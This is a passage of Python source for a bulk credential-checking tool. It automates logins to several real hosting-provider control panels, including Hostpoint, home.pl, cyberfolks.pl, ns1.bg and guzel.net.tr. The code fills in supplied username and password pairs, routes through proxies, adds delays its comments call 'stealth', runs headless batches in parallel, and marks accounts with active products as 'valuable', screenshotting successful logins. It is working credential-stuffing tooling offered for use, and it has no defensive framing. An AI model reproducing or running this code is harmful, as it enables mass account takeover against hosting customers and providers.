        # ── Step 1: Load login page (always use canonical login URL) ─────
        page.goto(LOGIN_URL, timeout=timeout * 1000,
                  wait_until="domcontentloaded")

        # Dismiss any cookie / GDPR banner before interacting with the form
        _dismiss_overlays(page, timeout_ms=timeout * 1_000)

        # Wait until the client field is actually present in the DOM
        try:
            page.wait_for_selector("input[name='client']",
                                   timeout=timeout * 1000, state="visible")
        except PWTimeout:
            return "ERROR: Login form did not appear"

        _random_delay(0.8, 1.5)

        # ── Step 2: Fill credentials ─────────────────────────────────────
        page.fill("input[name='client']", "")
        page.type("input[name='client']", username,
                  delay=random.randint(60, 150))
        _random_delay(0.4, 0.9)

        page.fill("input[name='password']", "")
        page.type("input[name='password']", password,
                  delay=random.randint(60, 150))
        _random_delay(0.5, 1.0)

        # ── Step 3: Submit form ──────────────────────────────────────────
        try:
            with page.expect_navigation(
                timeout=timeout * 1000, wait_until="domcontentloaded"
            ):
                page.click("button[type='submit']")
        except PWTimeout:
            pass

        try:
            page.wait_for_load_state("networkidle", timeout=6_000)
        except PWTimeout:
            pass

        _random_delay(0.8, 1.5)

        # ── Step 4: Check if login succeeded ────────────────────────────
        final_url = page.url.lower()

        # Still on login page → bad credentials
        if "/login" in final_url:
            html = page.content().lower()
            zetta_fail = [
                "invalid", "incorrect", "wrong", "error",
                "does not exist", "not found", "не е намерен",
                "невалиден", "грешна", "грешен",
                "authentication failed", "login failed",
            ]
            for kw in zetta_fail:
                if kw in html:
                    return "FAILED"
            return "UNKNOWN"

        # ── Step 5: Navigate to services/renew ──────────────────────────
        try:
            page.goto(RENEW_URL, timeout=timeout * 1000,
                      wait_until="domcontentloaded")
            try:
                page.wait_for_load_state("networkidle", timeout=5_000)
            except PWTimeout:
                pass
            _random_delay(0.5, 1.0)
        except PWTimeout:
            # If renew page times out, at least the login worked
            _logout_and_clear(page, context, timeout_ms=timeout * 1000)
            return "SUCCESS"

        # ── Step 6: Check for products ───────────────────────────────────
        renew_html = page.content().lower()

        # Redirected back to login from the renew page → session expired
        if "/login" in page.url.lower():
            return "UNKNOWN"

        if NO_PRODUCTS_TEXT in renew_html:
            # Login valid but account has no products
            _logout_and_clear(page, context, timeout_ms=timeout * 1000)
            return "FAILED — No products"

        # Has products — valuable account
        _logout_and_clear(page, context, timeout_ms=timeout * 1000)
        return "SUCCESS"

    except Exception as exc:
        err = str(exc).lower()
        if "net::err" in err or "connection" in err:
            return "UNREACHABLE"
        if "timeout" in err:
            return "TIMEOUT"
        return f"ERROR: {type(exc).__name__}: {str(exc)[:80]}"

def _try_login_ns1(
    page, context, username: str, password: str, timeout: int
) -> str:
    """
    Dedicated login handler for my.ns1.bg (WHMCS portal).

    Flow:
      1. Navigate to login page: https://my.ns1.bg/index.php?rp=/login
      2. Wait for email + password fields, fill and submit
      3. Success = redirected to /clientarea.php
      4. Navigate to /clientarea.php?action=services to check active products
         If has active services → SUCCESS
         If no services        → FAILED — No products

    WHMCS form fields:
      input[name='email']    — E-mail address
      input[name='password'] — Password
      input[type='submit']   — Submit button
    """
    from playwright.sync_api import TimeoutError as PWTimeout

    SERVICES_URL     = "https://my.ns1.bg/clientarea.php?action=services"
    NO_PRODUCTS_TEXT = "no products found"

    try:
        # ── Step 1: Load login page ──────────────────────────────────────
        page.goto(NS1_LOGIN_URL, timeout=timeout * 1000,
                  wait_until="domcontentloaded")

        # Dismiss any cookie / GDPR banner before interacting with the form
        _dismiss_overlays(page, timeout_ms=timeout * 1_000)

        # Wait until the email field is visible
        try:
            page.wait_for_selector("input[name='email']",
                                   timeout=timeout * 1000, state="visible")
        except PWTimeout:
            return "ERROR: NS1 login form did not appear"

        _random_delay(0.8, 1.5)

        # ── Step 2: Fill credentials ─────────────────────────────────────
        page.fill("input[name='email']", "")
        page.type("input[name='email']", username,
                  delay=random.randint(60, 150))
        _random_delay(0.4, 0.8)

        page.fill("input[name='password']", "")
        page.type("input[name='password']", password,
                  delay=random.randint(60, 150))
        _random_delay(0.4, 0.9)

        # ── Step 3: Submit ───────────────────────────────────────────────
        try:
            with page.expect_navigation(
                timeout=timeout * 1000, wait_until="domcontentloaded"
            ):
                page.click("input[type='submit'], button[type='submit']")
        except PWTimeout:
            pass

        try:
            page.wait_for_load_state("networkidle", timeout=6_000)
        except PWTimeout:
            pass

        _random_delay(0.8, 1.5)

        # ── Step 4: Check login result ───────────────────────────────────
        final_url = page.url.lower()
        html      = page.content().lower()

        # Still on login page → bad credentials
        if "rp=/login" in final_url or "/login" in final_url:
            fail_kw = [
                "invalid", "incorrect", "wrong", "error",
                "грешна", "невалиден", "грешен",
                "authentication failed",
            ]
            for kw in fail_kw:
                if kw in html:
                    return "FAILED"
            return "UNKNOWN"

        # ── Step 5: Check for active services ───────────────────────────
        try:
            page.goto(SERVICES_URL, timeout=timeout * 1000,
                      wait_until="domcontentloaded")
            try:
                page.wait_for_load_state("networkidle", timeout=6_000)
            except PWTimeout:
                pass
            _random_delay(0.5, 1.0)
        except PWTimeout:
            _logout_and_clear(page, context, timeout_ms=timeout * 1000)
            return "SUCCESS"

        # Redirected back to login → session issue
        if "rp=/login" in page.url.lower():
            return "UNKNOWN"

        services_html = page.content().lower()
        if NO_PRODUCTS_TEXT in services_html:
            _logout_and_clear(page, context, timeout_ms=timeout * 1000)
            return "FAILED — No products"

        _logout_and_clear(page, context, timeout_ms=timeout * 1000)
        return "SUCCESS"

    except Exception as exc:
        err = str(exc).lower()
        if "net::err" in err or "connection" in err:
            return "UNREACHABLE"
        if "timeout" in err:
            return "TIMEOUT"
        return f"ERROR: {type(exc).__name__}: {str(exc)[:80]}"

# ---------------------------------------------------------------------------
# Hostpoint fast-path helpers
# ---------------------------------------------------------------------------

# Auth-page URL prefix — if still here after submit → login failed
_HP_AUTH_PREFIX  = "admin.hostpoint.ch"
_HP_AUTH_PATH    = "/auth/"

# Exact selectors taken from the live HTML (PrimeNG Angular SPA)
_HP_USER_SEL     = "input#username"
_HP_PASS_SEL     = "input#Password"
# Login button: PrimeNG p-button with type="button" inside .button div
_HP_SUBMIT_SEL   = "div.button button.p-button"
# Cookie banner accept button — blocks the form until dismissed
_HP_COOKIE_SEL   = "button.button-accept"


def _hp_fill_fast(page, username: str, password: str, timeout_ms: int = 15_000) -> bool:
    """
    Fast fill for Hostpoint login page (no artificial delays).
    Returns True if both fields were filled successfully.
    """
    from playwright.sync_api import TimeoutError as PWTimeout
    try:
        page.wait_for_selector(_HP_USER_SEL, state="visible", timeout=timeout_ms)
    except PWTimeout:
        return False

    # Dismiss cookie banner if present (it appears on top of the form)
    try:
        if page.is_visible(_HP_COOKIE_SEL, timeout=1_500):
            page.click(_HP_COOKIE_SEL)
            page.wait_for_selector(_HP_COOKIE_SEL, state="hidden", timeout=3_000)
    except Exception:
        pass

    # Instant fill — no per-character delays needed for headless checks
    page.fill(_HP_USER_SEL, username)
    page.fill(_HP_PASS_SEL, password)
    return True


def _hp_submit_and_wait(page, timeout_ms: int = 12_000) -> None:
    """
    Click the Login button and wait for the Angular SPA route to change.
    Uses URL-polling instead of expect_navigation because PrimeNG buttons
    have type="button" and the route change is an Angular client-side nav.
    """
    from playwright.sync_api import TimeoutError as PWTimeout

    start_url = page.url
    try:
        page.click(_HP_SUBMIT_SEL)
    except Exception:
        try:
            page.keyboard.press("Enter")
        except Exception:
            pass

    # Poll for URL change (Angular client-side routing) — up to timeout_ms
    deadline = time.time() + timeout_ms / 1_000
    while time.time() < deadline:
        try:
            cur = page.url
        except Exception:
            break
        if cur != start_url:
            break
        time.sleep(0.15)

    # Short settle for Angular to render the result / error component
    try:
        page.wait_for_load_state("domcontentloaded", timeout=4_000)
    except PWTimeout:
        pass


def _hp_evaluate_result(page) -> str:
    """
    Read the current URL / DOM to decide SUCCESS / FAILED.
    """
    final_url = page.url.lower()

    # Redirected away from the auth subtree → success
    if _HP_AUTH_PATH not in final_url:
        return "SUCCESS"

    # Still on auth page — check for the Angular error component
    try:
        html = page.content().lower()
    except Exception:
        html = ""

    if "login failed" in html:
        return "FAILED"
    # Any other auth-page state (blank form, unknown error) → FAILED
    return "FAILED"


def _try_login_hostpoint(
    page, context, username: str, password: str, timeout: int
) -> str:
    """
    Dedicated login handler for admin.hostpoint.ch — used by the visible
    try_login() path.  Keeps light random delays for stealth.

    For batch headless checking use try_login_hostpoint_batch() instead.
    """
    from playwright.sync_api import TimeoutError as PWTimeout

    try:
        page.goto(HOSTPOINT_LOGIN_URL, timeout=timeout * 1_000,
                  wait_until="domcontentloaded")

        ok = _hp_fill_fast(page, username, password, timeout_ms=timeout * 1_000)
        if not ok:
            return "ERROR: Hostpoint login form did not appear"

        _random_delay(0.3, 0.6)   # minimal stealth pause before submit
        _hp_submit_and_wait(page, timeout_ms=timeout * 1_000)

        return _hp_evaluate_result(page)

    except Exception as exc:
        err = str(exc).lower()
        if "net::err" in err or "connection" in err:
            return "UNREACHABLE"
        if "timeout" in err:
            return "TIMEOUT"
        return f"ERROR: {type(exc).__name__}: {str(exc)[:80]}"


def try_login_hostpoint_batch(
    entry: dict,
    timeout: int = 15,
    screenshot_on: frozenset = frozenset(),
) -> tuple[str, bytes | None]:
    """
    Headless, zero-delay Hostpoint credential checker designed for bulk runs.

    Launches its own isolated headless Chromium context per call so that
    multiple instances can run in parallel via a ThreadPoolExecutor.

    Parameters
    ----------
    entry         : dict      — keys: username, password
    timeout       : int       — seconds to wait for the login page / result
    screenshot_on : frozenset — states that trigger a screenshot (e.g. {"SUCCESS"})

    Returns
    -------
    tuple[str, bytes | None]  — (status, jpeg_bytes_or_None)
    """
    try:
        from playwright.sync_api import TimeoutError as PWTimeout
    except ImportError:
        return "ERROR: playwright not installed", None

    username   = entry.get("username", "")
    password   = entry.get("password", "")
    timeout_ms = timeout * 1_000
    proxy      = _load_proxy()

    try:
        slot = _ensure_pool_slot(HOSTPOINT_LOGIN_URL, proxy=proxy)
    except Exception as exc:
        err = str(exc).lower()
        if "net::err" in err or "connection" in err:
            return "UNREACHABLE", None
        if "timeout" in err:
            return "TIMEOUT", None
        return f"ERROR: pool init: {exc}", None

    with slot.lock:
        try:
            page = slot.page

            # Dismiss cookie banner on first use of this slot
            if not slot.cookie_dismissed:
                try:
                    if page.is_visible(_HP_COOKIE_SEL, timeout=1_500):
                        page.click(_HP_COOKIE_SEL)
                        page.wait_for_selector(_HP_COOKIE_SEL, state="hidden",
                                               timeout=3_000)
                except Exception:
                    pass
                slot.cookie_dismissed = True

            # Ensure we are on the login page
            if page.url.rstrip("/") != HOSTPOINT_LOGIN_URL.rstrip("/"):
                ok = _pool_return_to_login(slot, timeout_ms=timeout_ms)
                if not ok:
                    return "ERROR: could not return to login page", None

            ok = _hp_fill_fast(page, username, password, timeout_ms=timeout_ms)
            if not ok:
                return "ERROR: form not found", None

            _hp_submit_and_wait(page, timeout_ms=timeout_ms)
            result = _hp_evaluate_result(page)

            screenshot = _screenshot_page(page) if _should_screenshot(result, screenshot_on) else None
            _pool_return_to_login(slot, timeout_ms=timeout_ms)
            return result, screenshot

        except Exception as exc:
            _pool_evict(HOSTPOINT_LOGIN_URL)
            err = str(exc).lower()
            if "net::err" in err or "connection" in err:
                return "UNREACHABLE", None
            if "timeout" in err:
                return "TIMEOUT", None
            return f"ERROR: {type(exc).__name__}: {str(exc)[:80]}", None


# ---------------------------------------------------------------------------
# home.pl — fast batch login checker
# ---------------------------------------------------------------------------

_HPL_USER_SEL    = "input[name='login']"
_HPL_PASS_SEL    = "input[name='password']"
_HPL_SUBMIT_SEL  = "button.a-btn"
_HPL_ERROR_SEL   = "p.a-error-text, .a-error-text"
_HPL_COOKIE_SEL  = "a.cmpboxbtnyes, button.cmpboxbtnyes, a.cmpboxbtnno, button.cmpboxbtnno, .cmptxt_btn_yes"


def _try_login_home_pl(
    page, context, username: str, password: str, timeout: int
) -> str:
    """
    Dedicated home.pl login handler used by both the interactive and the batch path.

    Strategy
    --------
    1. Navigate to https://panel.home.pl/.
    2. Dismiss cookie-consent banner (consentmanager.net) if visible.
    3. Fill username (input[name='login']) + password (input[name='password']).
    4. Click submit (button.a-btn).
    5. Evaluate:
       • error element visible  → FAILED
       • URL changed to a non-login page under panel.home.pl → SUCCESS
       • URL still at login page  → FAILED
    """
    from playwright.sync_api import TimeoutError as PWTimeout

    timeout_ms = timeout * 1_000

    # ── 1. Navigate ────────────────────────────────────────────────────────
    try:
        page.goto(HOME_PL_LOGIN_URL, timeout=timeout_ms, wait_until="domcontentloaded")
    except PWTimeout:
        return "TIMEOUT"
    except Exception as exc:
        err = str(exc).lower()
        if "net::err" in err or "connection" in err:
            return "UNREACHABLE"
        return f"ERROR: goto: {exc}"

    # ── 2. Dismiss cookie banner ───────────────────────────────────────────
    try:
        page.wait_for_selector(_HPL_COOKIE_SEL, timeout=5_000, state="visible")
        page.click(_HPL_COOKIE_SEL, timeout=3_000)
        try:
            page.wait_for_load_state("networkidle", timeout=5_000)
        except PWTimeout:
            pass
    except Exception:
        pass  # Banner not present or already dismissed — continue

    # ── 3. Wait for login form ─────────────────────────────────────────────
    try:
        page.wait_for_selector(_HPL_USER_SEL, timeout=10_000, state="visible")
    except PWTimeout:
        return "UNKNOWN (login form not found)"

    # ── 4. Fill credentials ────────────────────────────────────────────────
    try:
        page.fill(_HPL_USER_SEL, "")
        page.type(_HPL_USER_SEL, username, delay=random.randint(30, 70))
        page.fill(_HPL_PASS_SEL, "")
        page.type(_HPL_PASS_SEL, password, delay=random.randint(30, 70))
    except Exception as exc:
        return f"ERROR: fill failed: {exc}"

    # ── 5. Submit ──────────────────────────────────────────────────────────
    try:
        with page.expect_navigation(timeout=timeout_ms, wait_until="domcontentloaded"):
            page.click(_HPL_SUBMIT_SEL, timeout=5_000)
    except PWTimeout:
        pass  # SPA / AJAX — no full navigation redirect, fall through to evaluate
    except Exception:
        pass

    # Give any AJAX response time to settle
    try:
        page.wait_for_load_state("networkidle", timeout=8_000)
    except PWTimeout:
        pass

    # ── 6. Evaluate result ─────────────────────────────────────────────────
    # Check for visible error element first (most reliable signal)
    try:
        err_el = page.query_selector(_HPL_ERROR_SEL)
        if err_el and err_el.is_visible():
            return "FAILED"
    except Exception:
        pass

    final_url  = page.url.lower().rstrip("/")
    login_url  = HOME_PL_LOGIN_URL.lower().rstrip("/")

    # Still on the login page → credentials rejected
    if final_url == login_url:
        return "FAILED"

    # Redirected to a different page inside panel.home.pl → logged in
    if "panel.home.pl" in final_url and final_url != login_url:
        return "SUCCESS"

    # Redirected completely away (e.g. panel.home.pl/en/ or cpanel)
    if final_url != login_url:
        return "SUCCESS"

    return f"UNKNOWN (landed on: {page.url[:80]})"


def try_login_home_pl_batch(
    entry: dict,
    timeout: int = 15,
    screenshot_on: frozenset = frozenset(),
) -> tuple[str, bytes | None]:
    """
    Shared-browser home.pl credential checker for bulk runs.

    Uses a single persistent headless Chromium session for HOME_PL_LOGIN_URL —
    the browser is launched and the login page is loaded ONCE; each subsequent
    credential just fills, submits, evaluates, then navigates back.

    Parameters
    ----------
    entry         : dict      — keys: username, password
    timeout       : int       — seconds to wait per step
    screenshot_on : frozenset — states that trigger a screenshot (e.g. {"SUCCESS"})

    Returns
    -------
    tuple[str, bytes | None]  — (status, jpeg_bytes_or_None)
    """
    try:
        from playwright.sync_api import TimeoutError as PWTimeout
    except ImportError:
        return "ERROR: playwright not installed", None

    username   = entry.get("username", "")
    password   = entry.get("password", "")
    timeout_ms = timeout * 1_000
    proxy      = _load_proxy()

    try:
        slot = _ensure_pool_slot(HOME_PL_LOGIN_URL,
                                 proxy=proxy,
                                 locale="pl-PL", timezone_id="Europe/Warsaw")
    except Exception as exc:
        err = str(exc).lower()
        if "net::err" in err or "connection" in err:
            return "UNREACHABLE", None
        if "timeout" in err:
            return "TIMEOUT", None
        return f"ERROR: pool init: {exc}", None

    with slot.lock:
        try:
            page = slot.page

            # Dismiss cookie banner on first use
            if not slot.cookie_dismissed:
                try:
                    page.wait_for_selector(_HPL_COOKIE_SEL, timeout=5_000,
                                           state="visible")
                    page.click(_HPL_COOKIE_SEL, timeout=3_000)
                    try:
                        page.wait_for_load_state("networkidle", timeout=5_000)
                    except PWTimeout:
                        pass
                except Exception:
                    pass
                slot.cookie_dismissed = True

            # Ensure we are on the login page
            if page.url.rstrip("/") != HOME_PL_LOGIN_URL.rstrip("/"):
                ok = _pool_return_to_login(slot, timeout_ms=timeout_ms)
                if not ok:
                    return "ERROR: could not return to login page", None

            # Wait for the login form
            try:
                page.wait_for_selector(_HPL_USER_SEL, timeout=timeout_ms,
                                       state="visible")
            except PWTimeout:
                return "TIMEOUT", None

            # Fill credentials
            try:
                page.fill(_HPL_USER_SEL, "")
                page.type(_HPL_USER_SEL, username, delay=random.randint(30, 70))
                page.fill(_HPL_PASS_SEL, "")
                page.type(_HPL_PASS_SEL, password, delay=random.randint(30, 70))
            except Exception as exc:
                return f"ERROR: fill failed: {exc}", None

            # Submit
            try:
                with page.expect_navigation(timeout=timeout_ms,
                                            wait_until="domcontentloaded"):
                    page.click(_HPL_SUBMIT_SEL, timeout=5_000)
            except PWTimeout:
                pass
            except Exception:
                pass

            try:
                page.wait_for_load_state("networkidle", timeout=8_000)
            except PWTimeout:
                pass

            # Evaluate
            try:
                err_el = page.query_selector(_HPL_ERROR_SEL)
                if err_el and err_el.is_visible():
                    screenshot = _screenshot_page(page) if _should_screenshot("FAILED", screenshot_on) else None
                    _pool_return_to_login(slot, timeout_ms=timeout_ms)
                    return "FAILED", screenshot
            except Exception:
                pass

            final_url = page.url.lower().rstrip("/")
            login_url = HOME_PL_LOGIN_URL.lower().rstrip("/")

            if final_url == login_url:
                result = "FAILED"
            elif "panel.home.pl" in final_url:
                result = "SUCCESS"
            elif final_url != login_url:
                result = "SUCCESS"
            else:
                result = f"UNKNOWN (landed on: {page.url[:80]})"

            screenshot = _screenshot_page(page) if _should_screenshot(result, screenshot_on) else None
            _pool_return_to_login(slot, timeout_ms=timeout_ms)
            return result, screenshot

        except Exception as exc:
            _pool_evict(HOME_PL_LOGIN_URL)
            err = str(exc).lower()
            if "net::err" in err or "connection" in err:
                return "UNREACHABLE", None
            if "timeout" in err:
                return "TIMEOUT", None
            return f"ERROR: {type(exc).__name__}: {str(exc)[:80]}", None


# ---------------------------------------------------------------------------
# cyberfolks.pl — fast batch login checker
# ---------------------------------------------------------------------------

_CF_USER_SEL    = "input[name='username']"
_CF_PASS_SEL    = "input[name='password']"
_CF_SUBMIT_SEL  = "button[type='submit']"
# MUI error: alert role or .MuiAlert-root or text-containing element after failed login
_CF_ERROR_SEL   = ".MuiAlert-root, [role='alert'], .MuiFormHelperText-root.Mui-error"
_CF_COOKIE_SEL  = (
    "button[id*='accept'], button[id*='cookie'], "
    "button[class*='accept'], #onetrust-accept-btn-handler, "
    ".cmpboxbtnyes, button.cmpboxbtnyes"
)


def _try_login_cyberfolks(
    page, context, username: str, password: str, timeout: int
) -> str:
    """
    Dedicated cyberfolks.pl login handler.

    Strategy
    --------
    1. Navigate to the cyberfolks panel login page.
    2. Dismiss any cookie consent banner.
    3. Fill username (input[name='username']) + password (input[name='password']).
    4. Click submit (button[type='submit']).
    5. Evaluate:
       • MUI alert / error element visible → FAILED
       • URL changed away from login page  → SUCCESS
       • Still on login page               → FAILED
    """
    from playwright.sync_api import TimeoutError as PWTimeout

    timeout_ms = timeout * 1_000

    # ── 1. Navigate ────────────────────────────────────────────────────────
    try:
        page.goto(CYBERFOLKS_LOGIN_URL, timeout=timeout_ms, wait_until="domcontentloaded")
    except PWTimeout:
        return "TIMEOUT"
    except Exception as exc:
        err = str(exc).lower()
        if "net::err" in err or "connection" in err:
            return "UNREACHABLE"
        return f"ERROR: goto: {exc}"

    # ── 2. Dismiss cookie banner ───────────────────────────────────────────
    try:
        page.wait_for_selector(_CF_COOKIE_SEL, timeout=4_000, state="visible")
        page.click(_CF_COOKIE_SEL, timeout=3_000)
        try:
            page.wait_for_load_state("networkidle", timeout=4_000)
        except PWTimeout:
            pass
    except Exception:
        pass  # No banner — continue

    # ── 3. Wait for login form (React SPA — may need extra time) ───────────
    try:
        page.wait_for_selector(_CF_USER_SEL, timeout=12_000, state="visible")
    except PWTimeout:
        return "UNKNOWN (login form not found)"

    # ── 4. Fill credentials ────────────────────────────────────────────────
    try:
        page.fill(_CF_USER_SEL, "")
        page.type(_CF_USER_SEL, username, delay=random.randint(30, 70))
        page.fill(_CF_PASS_SEL, "")
        page.type(_CF_PASS_SEL, password, delay=random.randint(30, 70))
    except Exception as exc:
        return f"ERROR: fill failed: {exc}"

    # ── 5. Submit ──────────────────────────────────────────────────────────
    # React SPA — may not do a full page navigation; use both strategies
    try:
        with page.expect_navigation(timeout=timeout_ms, wait_until="domcontentloaded"):
            page.click(_CF_SUBMIT_SEL, timeout=5_000)
    except PWTimeout:
        pass  # SPA / AJAX login — evaluate after wait
    except Exception:
        pass

    # Wait for React to re-render the result
    try:
        page.wait_for_load_state("networkidle", timeout=10_000)
    except PWTimeout:
        pass

    # ── 6. Evaluate result ─────────────────────────────────────────────────
    # Check for MUI error/alert element
    try:
        err_el = page.query_selector(_CF_ERROR_SEL)
        if err_el and err_el.is_visible():
            return "FAILED"
    except Exception:
        pass

    final_url = page.url.lower().rstrip("/")
    login_url  = CYBERFOLKS_LOGIN_URL.lower().rstrip("/")

    # Still on the login page → credentials rejected
    if final_url == login_url or "/security/login" in final_url:
        return "FAILED"

    # Redirected to dashboard or another page
    if "cyberfolks.pl" in final_url:
        return "SUCCESS"

    # Redirected completely away (e.g. billing/dashboard)
    if final_url != login_url:
        return "SUCCESS"

    return f"UNKNOWN (landed on: {page.url[:80]})"


def try_login_cyberfolks_batch(
    entry: dict,
    timeout: int = 15,
    screenshot_on: frozenset = frozenset(),
) -> tuple[str, bytes | None]:
    """
    Shared-browser cyberfolks.pl credential checker for bulk runs.

    Uses a single persistent headless Chromium session for CYBERFOLKS_LOGIN_URL —
    the browser is launched and the login page is loaded ONCE; each subsequent
    credential just fills, submits, evaluates, then navigates back.

    Parameters
    ----------
    entry         : dict      — keys: username, password
    timeout       : int       — seconds to wait per step
    screenshot_on : frozenset — states that trigger a screenshot (e.g. {"SUCCESS"})

    Returns
    -------
    tuple[str, bytes | None]  — (status, jpeg_bytes_or_None)
    """
    try:
        from playwright.sync_api import TimeoutError as PWTimeout
    except ImportError:
        return "ERROR: playwright not installed", None

    username   = entry.get("username", "")
    password   = entry.get("password", "")
    timeout_ms = timeout * 1_000
    proxy      = _load_proxy()

    try:
        slot = _ensure_pool_slot(CYBERFOLKS_LOGIN_URL,
                                 proxy=proxy,
                                 locale="pl-PL", timezone_id="Europe/Warsaw")
    except Exception as exc:
        err = str(exc).lower()
        if "net::err" in err or "connection" in err:
            return "UNREACHABLE", None
        if "timeout" in err:
            return "TIMEOUT", None
        return f"ERROR: pool init: {exc}", None

    with slot.lock:
        try:
            page = slot.page

            # Dismiss cookie banner on first use
            if not slot.cookie_dismissed:
                try:
                    page.wait_for_selector(_CF_COOKIE_SEL, timeout=4_000,
                                           state="visible")
                    page.click(_CF_COOKIE_SEL, timeout=3_000)
                    try:
                        page.wait_for_load_state("networkidle", timeout=4_000)
                    except PWTimeout:
                        pass
                except Exception:
                    pass
                slot.cookie_dismissed = True

            # Ensure we are on the login page
            if "/security/login" not in page.url.lower():
                ok = _pool_return_to_login(slot, timeout_ms=timeout_ms)
                if not ok:
                    return "ERROR: could not return to login page", None

            # Wait for login form (React SPA may take extra time)
            try:
                page.wait_for_selector(_CF_USER_SEL, timeout=timeout_ms,
                                       state="visible")
            except PWTimeout:
                return "TIMEOUT", None

            # Fill credentials
            try:
                page.fill(_CF_USER_SEL, "")
                page.type(_CF_USER_SEL, username, delay=random.randint(30, 70))
                page.fill(_CF_PASS_SEL, "")
                page.type(_CF_PASS_SEL, password, delay=random.randint(30, 70))
            except Exception as exc:
                return f"ERROR: fill failed: {exc}", None

            # Submit
            try:
                with page.expect_navigation(timeout=timeout_ms,
                                            wait_until="domcontentloaded"):
                    page.click(_CF_SUBMIT_SEL, timeout=5_000)
            except PWTimeout:
                pass
            except Exception:
                pass

            try:
                page.wait_for_load_state("networkidle", timeout=10_000)
            except PWTimeout:
                pass

            # Evaluate
            try:
                err_el = page.query_selector(_CF_ERROR_SEL)
                if err_el and err_el.is_visible():
                    screenshot = _screenshot_page(page) if _should_screenshot("FAILED", screenshot_on) else None
                    _pool_return_to_login(slot, timeout_ms=timeout_ms)
                    return "FAILED", screenshot
            except Exception:
                pass

            final_url = page.url.lower().rstrip("/")
            login_url = CYBERFOLKS_LOGIN_URL.lower().rstrip("/")

            if final_url == login_url or "/security/login" in final_url:
                result = "FAILED"
            elif "cyberfolks.pl" in final_url:
                result = "SUCCESS"
            elif final_url != login_url:
                result = "SUCCESS"
            else:
                result = f"UNKNOWN (landed on: {page.url[:80]})"

            screenshot = _screenshot_page(page) if _should_screenshot(result, screenshot_on) else None
            _pool_return_to_login(slot, timeout_ms=timeout_ms)
            return result, screenshot

        except Exception as exc:
            _pool_evict(CYBERFOLKS_LOGIN_URL)
            err = str(exc).lower()
            if "net::err" in err or "connection" in err:
                return "UNREACHABLE", None
            if "timeout" in err:
                return "TIMEOUT", None
            return f"ERROR: {type(exc).__name__}: {str(exc)[:80]}", None


def _try_login_guzel(
    page, context, username: str, password: str, timeout: int
) -> str:
    """
    Dedicated login handler for guzel.net.tr (Turkish hosting provider).
    
    Uses JavaScript injection to directly manipulate the form, since Playwright
    selectors often fail with this site's dynamically-generated content.
    """
    from playwright.sync_api import TimeoutError as PWTimeout

    LOGIN_URL = "https://www.guzel.net.tr/clientarea.php"
    timeout_ms = timeout * 1_000

    try:
        # ── Step 1: Navigate ────────────────────────────────────────────────
        print("[GUZEL] Navigating to login page...")
        page.goto(LOGIN_URL, timeout=timeout_ms, wait_until="domcontentloaded")
        
        # Wait for page to fully load with extra time for JS and CloudFlare
        print("[GUZEL] Waiting for page and JavaScript to load (25 seconds)...")
        try:
            page.wait_for_load_state("networkidle", timeout=25_000)
        except PWTimeout:
            print("[GUZEL] Network idle timeout, continuing anyway...")
        
        _random_delay(2.0, 4.0)
        
        # ── Step 1.5: Dismiss cookie/overlay banners ────────────────────────
        print("[GUZEL] Dismissing overlays and cookie banners...")
        page.evaluate("""
        () => {
            // Close cookie consent banner
            const cookieBtn = document.querySelector('.wpcc-compliance a, .cookie-accept, [class*="cookie"] button');
            if (cookieBtn) {
                cookieBtn.click();
                console.log('Closed cookie banner');
            }
            
            // Close any modals/overlays
            const modals = document.querySelectorAll('[role="dialog"], .modal, [class*="overlay"]');
            modals.forEach(m => {
                if (m.style.display !== 'none') {
                    const closeBtn = m.querySelector('[class*="close"], button[aria-label*="close"]');
                    if (closeBtn) closeBtn.click();
                }
            });
        }
        """)

        # ── Step 2: Use JavaScript to fill form ─────────────────────────────
        print("[GUZEL] Using JavaScript injection to fill form...")
        
        form_fill_result = page.evaluate(f"""
        () => {{
            console.log('Starting form fill...');
            console.log('Page URL:', window.location.href);
            
            // Detailed inspection
            const emailInputs = document.querySelectorAll('input[type="email"]');
            console.log('Found email inputs:', emailInputs.length);
            emailInputs.forEach((el, i) => {{
                console.log(`  Email ${i}:`, {{
                    id: el.id,
                    name: el.name,
                    visible: el.offsetHeight > 0 && el.offsetWidth > 0,
                    disabled: el.disabled
                }});
            }});
            
            const passInputs = document.querySelectorAll('input[type="password"]');
            console.log('Found password inputs:', passInputs.length);
            passInputs.forEach((el, i) => {{
                console.log(`  Pass ${i}:`, {{
                    id: el.id,
                    name: el.name,
                    visible: el.offsetHeight > 0 && el.offsetWidth > 0,
                    disabled: el.disabled
                }});
            }});
            
            // Try to find email input with multiple selectors
            let emailEl = document.querySelector('input[name="username"]') ||
                          document.querySelector('input#inputEmail') ||
                          document.querySelector('input[type="email"]');
            
            let passEl = document.querySelector('input[name="password"]') ||
                         document.querySelector('input#inputPassword') ||
                         document.querySelector('input[type="password"]');
            
            let submitBtn = document.querySelector('input#loginbutonu') ||
                           document.querySelector('input[type="submit"]') ||
                           document.querySelector('button[type="submit"]');
            
            if (!emailEl) {{
                return {{ success: false, error: 'Email field not found', debug: 'No email input located' }};
            }}
            
            if (!passEl) {{
                return {{ success: false, error: 'Password field not found', debug: 'No password input located' }};
            }}
            
            if (!submitBtn) {{
                return {{ success: false, error: 'Submit button not found', debug: 'No submit button located' }};
            }}
            
            try {{
                // Make sure they're visible and enabled
                emailEl.disabled = false;
                passEl.disabled = false;
                submitBtn.disabled = false;
                
                // Scroll into view
                emailEl.scrollIntoView({{behavior: 'smooth', block: 'center'}});
                
                // Fill email
                emailEl.click();
                emailEl.focus();
                emailEl.value = '';
                emailEl.value = '{username}';
                emailEl.dispatchEvent(new Event('input', {{ bubbles: true }}));
                emailEl.dispatchEvent(new Event('change', {{ bubbles: true }}));
                emailEl.dispatchEvent(new Event('blur', {{ bubbles: true }}));
                
                if (emailEl.value !== '{username}') {{
                    return {{ success: false, error: 'Email value mismatch after fill', debug: `Expected: {username}, Got: ${{emailEl.value}}` }};
                }}
                
                // Fill password
                passEl.click();
                passEl.focus();
                passEl.value = '';
                passEl.value = '{password}';
                passEl.dispatchEvent(new Event('input', {{ bubbles: true }}));
                passEl.dispatchEvent(new Event('change', {{ bubbles: true }}));
                passEl.dispatchEvent(new Event('blur', {{ bubbles: true }}));
                
                return {{ 
                    success: true, 
                    email: emailEl.value,
                    pass_filled: passEl.value ? true : false,
                    submit_enabled: !submitBtn.disabled
                }};
            }} catch (e) {{
                return {{ success: false, error: 'Exception during fill: ' + e.message }};
            }}
        }}
        """)
        
        print(f"[GUZEL] Form fill result: {form_fill_result}")
        
        if not form_fill_result.get('success'):
            error = form_fill_result.get('error', 'Unknown error')
            debug = form_fill_result.get('debug', '')
